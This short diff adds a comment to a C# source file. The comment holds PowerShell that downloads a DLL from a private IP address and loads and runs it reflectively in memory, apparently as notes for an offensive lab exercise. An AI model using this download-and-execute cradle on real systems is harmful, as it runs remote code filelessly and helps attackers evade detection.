@@ -1,3 +1,14 @@
+/* LOADED IN POWERSHELL
+ * Copy dll in webroot
+
+$data = (New-Object system.Net.WebClient).DownloadData('http://192.168.49.71/ClassLibrary1.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
+
+*/
+
 using System;
 using System.Collections.Generic;
 using System.Linq;
